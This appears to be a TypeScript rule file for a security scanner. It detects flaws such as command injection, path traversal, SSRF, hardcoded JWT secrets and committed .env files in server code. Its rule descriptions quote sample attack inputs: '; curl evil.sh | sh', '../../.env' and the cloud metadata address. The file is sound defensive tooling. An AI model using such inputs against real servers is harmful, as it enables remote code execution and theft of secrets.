/**
 * More dangerous code patterns, in the same spirit as repoCheckCode.ts: a shape that is almost always a flaw, tied to
 * request data or to an unambiguous literal, with no data-flow analysis. A rule that cannot tell a flaw from a safe use
 * from the text alone is reported at low confidence, which the report lists under "needs verification", and says so.
 *
 * Source of the list: what GitHub CodeQL, Semgrep and Snyk Code flag most often in the kind of server code AI builders
 * write (Express, Next.js route handlers, Supabase edge functions), cut to the patterns that stay accurate as a regex.
 */
import { isPlaceholderToken, looksLikeReference } from "./secretPlaceholders";
import { isCodePath, isEnvFilePath, type Rule } from "./repoCodePaths";
import { isPublicByDesignName, isPublicByDesignValue } from "./publicKeys";

const REQ = String.raw`(?:req|request)\.(?:body|query|params)`;
const ENV_NAME = /^[A-Z][A-Z0-9_]{3,}$/;

const MARKS = { comment: /^\s*(?:\/\/|\/\*|\*|#)/ };
/** The first match that is code, not a line of a comment or documentation. */
function firstInCode(text: string, re: RegExp): RegExpExecArray | null {
  const g = new RegExp(re.source, re.flags.includes("g") ? re.flags : `${re.flags}g`);
  for (const m of text.matchAll(g)) {
    const lineStart = text.lastIndexOf("\n", m.index! - 1) + 1;
    if (!MARKS.comment.test(text.slice(lineStart, m.index!))) return m as RegExpExecArray;
  }
  return null;
}

const SERVER_ROUTE = /(?:^|\/)(?:app\/(?:.+\/)?route|pages\/api\/.+)\.[cm]?[jt]sx?$/i;
const DATA_CHANGE = /\b(?:supabaseAdmin|serviceRole|SERVICE_ROLE|createServiceClient)\b|\bprisma\.\w+\.(?:create|update|delete|upsert|deleteMany|updateMany)\(|\.from\(\s*["'`][^"'`]+["'`]\s*\)\s*\.(?:insert|update|delete|upsert)\(|\bdb\.(?:insert|update|delete)\(/;
const AUTH_SEEN = /\b(?:getUser|getSession|getServerSession|auth\(\)|currentUser|requireAuth|withAuth|verifyToken|verifyJwt|jwtVerify|jwt\.verify|isAuthenticated|clerkClient|getToken|validateRequest|requireUser|authenticate|checkAuth|session\b)|\bauthorization\b|\bBearer\b|supabase\.auth|createRouteHandlerClient|createServerClient|createServerComponentClient|\bcookies\(\)|\bgetAuth\b|x-api-key|x-webhook|stripe-signature|constructEvent|svix/i;

export const MORE_RULES: Rule[] = [
  {
    name: "Hardcoded JWT Signing Secret",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, /\bjwt\.(?:sign|verify)\(\s*[^;\n]{0,120}?,\s*(["'`])([^"'`\n$]{6,})\1/);
      if (m && !ENV_NAME.test(m[2]!)) return { detail: `Code: jwt.${/\.verify/.test(m[0]) ? "verify" : "sign"}(…, "<${m[2]!.length}-character literal>")` };
      const jose = /\b(?:SignJWT|jwtVerify)\b/.test(text) ? firstInCode(text, /new\s+TextEncoder\(\)\.encode\(\s*(["'`])([^"'`\n$]{8,})\1\s*\)/) : null;
      return jose && !ENV_NAME.test(jose[2]!) && !isPlaceholderToken(jose[2]!) ? { detail: `Code: new TextEncoder().encode("<${jose[2]!.length}-character literal>")` } : null;
    },
    severity: "high", category: "Authentication", cweId: "CWE-798", cvssScore: 8.1, confidence: 75,
    description: "A token is signed or verified with a secret written in the code. Anyone who can read the repository can mint a valid token for any user, including an administrator, and the secret stays in Git history after it is removed.",
    solution: "Read the secret from a server-side environment variable, make it long and random (at least 32 bytes), and rotate it now: every token signed with the old one can be forged.",
  },
  {
    name: "JWT Verification Accepts the none Algorithm",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, /algorithms\s*:\s*\[[^\]]*["'`]none["'`]/i);
      return m ? { detail: `Code: ${m[0].slice(0, 80)}` } : null;
    },
    severity: "high", category: "Authentication", cweId: "CWE-347", cvssScore: 9.1, confidence: 80,
    description: "Token verification is told to accept the \"none\" algorithm, which means an unsigned token is valid. Anyone can write a token claiming to be any user.",
    solution: "List only the algorithm you sign with (for example [\"HS256\"] or [\"RS256\"]) and never \"none\".",
  },
  {
    name: "Raw SQL Built by String Concatenation or Interpolation",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, /\$(?:query|execute)RawUnsafe\(\s*(?:`[^`]*\$\{|["'][^"'\n]*["']\s*\+)/);
      return m ? { detail: `Code: ${m[0].slice(0, 90)}` } : null;
    },
    severity: "medium", category: "Injection", cweId: "CWE-89", cvssScore: 7.5, confidence: 55,
    description: "Prisma's *Unsafe raw query methods are given a string built from other values. If any of them comes from a request, that is SQL injection. The scanner cannot see where the values come from, so check them.",
    solution: "Use $queryRaw with the tagged template (Prisma binds each ${value} as a parameter), or pass the values as separate arguments.",
  },
  {
    name: "Operating-System Command Built From Request Data",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, new RegExp(String.raw`\b(?:exec|execSync|spawn|spawnSync)\(\s*(?:` + "`[^`]*\\$\\{\\s*" + REQ + String.raw`|["'][^"'\n]*["']\s*\+\s*` + REQ + ")"));
      return m ? { detail: `Code: ${m[0].slice(0, 110)}` } : null;
    },
    severity: "high", category: "Injection", cweId: "CWE-78", cvssScore: 9.8, confidence: 80,
    description: "A shell command is assembled from request data. A value such as `; curl evil.sh | sh` then runs on the server with its privileges.",
    solution: "Do not build a shell string. Use execFile or spawn with the arguments as an array and no shell, and validate the values against an allow-list.",
  },
  {
    name: "File Path Taken From Request Data",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, new RegExp(String.raw`\b(?:readFile|readFileSync|createReadStream|sendFile|unlink|unlinkSync|writeFile|writeFileSync)\(\s*(?:path\.(?:join|resolve)\([^)]*\b` + REQ + String.raw`\b[^)]*\)|` + REQ + String.raw`\b)`));
      return m ? { detail: `Code: ${m[0].slice(0, 110)}` } : null;
    },
    severity: "medium", category: "Injection", cweId: "CWE-22", cvssScore: 7.5, confidence: 60,
    description: "A file is read, sent or written at a path that includes request data. A value like ../../.env walks out of the intended folder and reads or overwrites any file the server can reach. The scanner cannot see a check elsewhere, so confirm there is one.",
    solution: "Resolve the final path and require it to start with the intended directory (path.resolve then startsWith), or look the file up by an id from a fixed list instead of using the name the client sent.",
  },
  {
    name: "Server Fetches a URL Taken From Request Data",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, new RegExp(String.raw`\b(?:fetch|axios(?:\.(?:get|post|put|request))?|got|http\.get|https\.get)\(\s*` + REQ + String.raw`\.\w+`));
      return m ? { detail: `Code: ${m[0].slice(0, 100)}` } : null;
    },
    severity: "medium", category: "Injection", cweId: "CWE-918", cvssScore: 7.5, confidence: 65,
    description: "The server requests a URL that the caller supplied. That is server-side request forgery: the caller can make your server fetch internal addresses (cloud metadata at 169.254.169.254, localhost services) and read the answer.",
    solution: "Accept an id or a host from an allow-list instead of a URL, or resolve the host and refuse private, loopback and link-local addresses before connecting (and refuse redirects).",
  },
  {
    name: "Redirect to an Address Taken From Request Data",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, new RegExp(String.raw`\bres\.redirect\(\s*(?:\d{3}\s*,\s*)?` + REQ + String.raw`\.\w+\s*\)`));
      return m ? { detail: `Code: ${m[0].slice(0, 90)}` } : null;
    },
    severity: "medium", category: "Injection", cweId: "CWE-601", cvssScore: 6.1, confidence: 65,
    description: "The server redirects to an address the caller supplied. A link on your domain can then send people to a phishing page, and the redirect lends it your domain's trust.",
    solution: "Redirect only to relative paths that start with a single slash, or to an allow-list of hosts.",
  },
  {
    name: "Predictable Random Number Used for a Secret",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, /\b(?:token|secret|password|passwd|session\w*|otp|nonce|apiKey|api_key|resetCode|verificationCode|inviteCode)\w*\s*[:=]\s*[^;\n]*\bMath\.random\(\)/i);
      return m ? { detail: `Code: ${m[0].slice(0, 100)}` } : null;
    },
    severity: "medium", category: "Cryptography", cweId: "CWE-338", cvssScore: 5.9, confidence: 55,
    description: "A token, code or secret is built from Math.random(), which is not cryptographically secure: its output can be predicted from a few observed values, so an attacker can guess reset links, invite codes or session ids.",
    solution: "Use crypto.randomBytes(32) (Node) or crypto.getRandomValues (browser and edge) for anything an attacker must not guess.",
  },
  {
    name: "Password Hashed With MD5 or SHA-1",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, /createHash\(\s*["'](?:md5|sha1)["']\s*\)\s*\.update\(\s*[^)]*pass(?:word)?/i) ?? firstInCode(text, /\bmd5\(\s*[^)]*pass(?:word)?/i);
      return m ? { detail: `Code: ${m[0].slice(0, 90)}` } : null;
    },
    severity: "medium", category: "Cryptography", cweId: "CWE-327", cvssScore: 7.5, confidence: 70,
    description: "A password is hashed with MD5 or SHA-1. Both are fast, so after a database leak an attacker tries billions of guesses a second and recovers most passwords.",
    solution: "Hash passwords with a slow, salted algorithm built for it: argon2id, bcrypt (cost 12 or more) or scrypt. Rehash each user's password at their next sign-in.",
  },
  {
    name: "Session Cookie Without HttpOnly or Secure",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      const m = firstInCode(text, /(?:\.cookie\(|\bsession\(|cookieSession\()[^;]{0,240}?\{[^}]*\b(?:httpOnly|secure)\s*:\s*false\b/is);
      return m ? { detail: `Code: ${m[0].replace(/\s+/g, " ").slice(0, 110)}` } : null;
    },
    severity: "low", category: "Session Management", cweId: "CWE-1004", cvssScore: 4.3, confidence: 65,
    description: "A cookie is set with httpOnly or secure turned off. Without HttpOnly any script on the page, including an injected one, can read it; without Secure it is also sent over plain HTTP. (A development-only switch is common: check it is not what runs in production.)",
    solution: "Set httpOnly: true and secure: true (and sameSite: \"lax\" or \"strict\") for session cookies, and relax them only for local development through an environment check.",
  },
  {
    name: "dangerouslySetInnerHTML With Unsanitised Content",
    test: (path, text) => {
      if (!isCodePath(path)) return null;
      for (const m of text.matchAll(/dangerouslySetInnerHTML=\{\{\s*__html\s*:\s*([^}]+?)\s*\}\}/g)) {
        const expr = m[1]!;
        if (/^["'`]/.test(expr) || /^[A-Z][A-Z0-9_]*,?$/.test(expr.trim()) ||/JSON\.stringify|sanitiz|DOMPurify|purify|escape|xss\(|__html\s*:\s*t\(|dedent|\bcss\b/i.test(expr)) continue;
        return { detail: `Code: ${m[0].replace(/\s+/g, " ").slice(0, 100)}` };
      }
      return null;
    },
    severity: "medium", category: "Injection", cweId: "CWE-79", cvssScore: 6.1, confidence: 50,
    description: "React is told to insert a value as raw HTML. If that value contains anything a user wrote (a comment, a profile field, rendered Markdown), a script in it runs in other people's browsers. The scanner cannot see where the value comes from, so check it.",
    solution: "Sanitise the value with DOMPurify before inserting it, or render the content as React elements instead of raw HTML.",
  },
  {
    name: "API Route Changes Data With No Sign-In Check Visible",
    test: (path, text) => {
      if (!SERVER_ROUTE.test(path) || /\.test\.|\/__tests__\//.test(path)) return null;
      if (!/export\s+(?:async\s+)?function\s+(?:POST|PUT|PATCH|DELETE)\b|export\s+const\s+(?:POST|PUT|PATCH|DELETE)\b|export\s+default\s+(?:async\s+)?function/.test(text)) return null;
      const m = DATA_CHANGE.exec(text);
      return m && !AUTH_SEEN.test(text) ? { detail: `Code: ${m[0].slice(0, 80)}; no session, token or signature check found in this file` } : null;
    },
    severity: "medium", category: "Access Control", cweId: "CWE-306", cvssScore: 7.5, confidence: 45,
    description: "A route handler that creates, changes or deletes data, or uses a service-role client, shows no check of who is calling: no session lookup, token verification or webhook signature. If nothing earlier in the chain (middleware, a wrapper) checks it, anyone on the internet can call it. The scanner reads one file at a time, so confirm where authentication happens.",
    solution: "Check the caller first thing in the handler (a session or JWT lookup, a webhook signature) and reject with 401 before touching data, and do not use a service-role client for a request that has not been authenticated.",
  },
  {
    name: "Environment File Committed to the Repository",
    test: (path, text) => {
      if (!isEnvFilePath(path)) return null;
      const SECRETISH = /SECRET|KEY|TOKEN|PASSWORD|PASSWD|PRIVATE|DATABASE_URL|DB_URL|DSN|CREDENTIAL|SERVICE_ROLE/i;
      const set = [...text.matchAll(/^\s*(?:export\s+)?([A-Z][A-Z0-9_]*)\s*=\s*["']?([^\s"'#][^\s"']*)/gm)]
        .filter((m) => SECRETISH.test(m[1]!) && !isPublicByDesignName(m[1]!.toLowerCase().replace(/[_.\-\s]/g, "")) && !isPublicByDesignValue(m[2]!, m[1]!) && m[2]!.length >= 6 && !isPlaceholderToken(m[2]!) && !looksLikeReference(m[2]!) && !/^(?:your|changeme|example|todo|xxx|<|\$\{?)/i.test(m[2]!) && !/^(?:true|false|null|none)$/i.test(m[2]!));
      return set.length > 0 ? { detail: `Variables set: ${set.slice(0, 6).map((m) => m[1]).join(", ")}${set.length > 6 ? ` and ${set.length - 6} more` : ""} (values not shown)` } : null;
    },
    severity: "medium", category: "Exposed Secrets / Credentials", cweId: "CWE-538", cvssScore: 6.5, confidence: 85,
    description: "A real environment file (not an .example) is committed, and it sets variables with secret-like names to non-placeholder values. It is the file that is meant to stay on the machine, and once committed it stays in Git history, readable by everyone with access to the repository.",
    solution: "Remove it from the repository (git rm --cached) and add it to .gitignore, rotate every secret it held (history keeps them), and commit a .env.example with placeholder values instead.",
  },
];
